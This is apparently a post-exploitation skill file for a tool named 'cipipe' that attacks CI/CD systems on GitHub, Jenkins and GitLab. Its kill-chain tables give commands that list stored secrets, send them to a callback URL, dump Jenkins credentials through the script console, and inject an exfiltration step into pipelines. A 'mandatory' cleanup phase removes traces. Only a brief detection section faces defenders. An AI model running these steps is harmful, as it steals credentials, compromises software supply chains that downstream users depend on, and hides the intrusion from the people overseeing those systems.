---
name: cicd-attacks
description: CI/CD pipeline attacks for secret extraction, pipeline injection, and supply chain compromise via GitHub/Jenkins/GitLab
category: post-exploitation
tags: [cicd, github-actions, jenkins, gitlab, pipeline, supply-chain, secret-extraction, credential-access]
tech_stack: [github, jenkins, gitlab, python, requests]
cwe_ids: [CWE-522, CWE-693, CWE-829, CWE-284]
chains_with: [T1195.002, T1552.004, T1059, T1098]
prerequisites: [T1078]
version: "1.0"
---

# CI/CD Pipeline Attack Methodology

CI/CD pipeline attacks target the software delivery infrastructure to extract secrets, inject malicious code, and establish persistence. After gaining access to GitHub, Jenkins, or GitLab, these tools extract stored credentials, inject pipeline steps for secret exfiltration, and manipulate workflow configurations.

## Prerequisites

1. **CI/CD access** — API token, personal access token, or service account credentials
2. **Python packages** — `pip3 install requests`
3. **API access** — Valid token with appropriate scopes (repo, admin, workflow)

```bash
# Quick prerequisite check — GitHub
curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user | jq .login

# Quick prerequisite check — Jenkins
curl -s -u "$JENKINS_USER:$JENKINS_TOKEN" "$JENKINS_URL/api/json" | jq .nodeDescription

# Quick prerequisite check — GitLab
curl -s -H "Private-Token: $GITLAB_TOKEN" "$GITLAB_URL/api/v4/user" | jq .username
```

## Kill Chain Phases

### Phase 1 — Reconnaissance

| Action | Command | Purpose |
|--------|---------|---------|
| List GitHub secrets | `cipipe gh_secrets --repo OWNER/REPO --method list` | Enumerate repository and environment secret names |
| Jenkins credentials | `cipipe jenkins_creds --url URL --method api` | List credential store entries |
| GitLab variables | `cipipe gitlab_tokens --url URL --project-id ID` | Enumerate CI/CD variables and tokens |

### Phase 2 — Secret Extraction

| Action | Command | Purpose |
|--------|---------|---------|
| GitHub dispatch | `cipipe gh_secrets --repo OWNER/REPO --method dispatch --callback-url URL` | Exfiltrate secrets via workflow dispatch |
| Jenkins console | `cipipe jenkins_creds --url URL --method console` | Extract credentials via Groovy Script Console |
| GitHub logs | `cipipe gh_secrets --repo OWNER/REPO --method logs` | Search workflow logs for leaked secrets |

### Phase 3 — Pipeline Injection

| Action | Command | Purpose |
|--------|---------|---------|
| Inject pipeline | `cipipe pipeline_inject --repo OWNER/REPO --callback-url URL` | Add exfiltration step to CI/CD pipeline |

### Phase 4 — Cleanup (MANDATORY)

```
cipipe cleanup_ci
```

## Detection Considerations

- **GitHub Audit Log** — Workflow creation, secret access, branch creation
- **Jenkins Audit Trail Plugin** — Script console access, credential reads
- **GitLab Audit Events** — Variable access, runner token reads, pipeline modifications
- **Branch Protection Rules** — Prevent direct push to main/protected branches
- **Required Reviews** — PR approval requirements block unauthorized workflow changes
- **Secret Scanning** — GitHub/GitLab native scanning for leaked credentials

## Program Reference

| Program | Technique | MITRE ATT&CK |
|---------|-----------|---------------|
| gh_secrets | GitHub Actions secret extraction | T1552.004 — Private Keys |
| jenkins_creds | Jenkins credential dump | T1555 — Credentials from Password Stores |
| pipeline_inject | CI/CD pipeline injection | T1195.002 — Compromise Software Supply Chain |
| gitlab_tokens | GitLab CI/CD variable extraction | T1552.004 — Private Keys |
| cleanup_ci | Pipeline modification rollback | T1070 — Indicator Removal |
